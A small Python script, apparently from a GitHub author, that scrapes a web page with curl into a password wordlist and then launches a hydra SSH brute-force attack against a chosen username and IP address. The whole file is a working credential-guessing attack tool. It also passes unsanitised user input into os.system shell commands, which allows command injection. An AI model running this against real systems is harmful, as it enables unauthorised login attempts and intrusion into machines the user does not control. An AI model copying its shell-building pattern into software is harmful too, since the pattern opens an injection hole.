#fastWordHydra
#author: github.com/vinicgoulart
#date: 09/10/2022
#version 1.0.0
import os

simpleURI = input("Digite a URI \n")

sed = "sed 's/[^a-zA-Z ]/ /g'"

tr = "tr 'A-Z ' 'a-z\\n'"

grep = "grep -Eio '[a-z]{6,}'" ##gets only 6+ length passwords

sort = "sort -u > completeWordList.txt" ##writes the wordlist to a file named completeWordList.txt in the current folder

cmd = 'curl ' + '"' + simpleURI + '"' + " | " + sed + " | " + tr + " | " + grep + " | " + sort

os.system(cmd) ##executes the command

useHydra = input("Deseja aplicar a word list no hydra? \n")

if str.lower(useHydra) == 'y':
    userName = input("Digite o possivel nome do usuário! \n")
    machineIp = input("Digite o endereço ipv4 da máquina com pontos. \n")
  
    hydraCmd = "hydra -l " + userName + " -P completeWordList.txt -V -f -t 4 " + machineIp + " ssh" 

    os.system(hydraCmd) ##execute hydra's brute force attack

else:
    print("terminando programa \n") ##ends the program.
    exit()